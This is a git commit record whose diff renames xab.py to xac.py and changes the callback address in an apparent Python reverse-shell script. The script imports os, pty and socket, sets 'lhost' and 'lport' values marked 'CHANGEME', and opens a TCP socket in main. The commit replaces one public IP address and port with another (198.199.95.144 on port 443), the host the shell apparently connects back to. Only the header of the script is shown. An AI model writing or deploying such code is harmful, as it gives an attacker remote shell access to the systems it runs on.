af66db170819a91e831b5c870a58489c42c0692e
jacksp7 <62326652+jacksp7@users.noreply.github.com>
2020-06-12 13:11:57 -0400

    Update and rename xab.py to xac.py

--- xac.py
+++ xac.py
@@ -11,8 +11,8 @@ import os
 import pty
 import socket
 
-lhost = "37.139.20.209" # XXX: CHANGEME
-lport = 80 # XXX: CHANGEME
+lhost = "198.199.95.144" # XXX: CHANGEME
+lport = 443 # XXX: CHANGEME
 
 def main():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
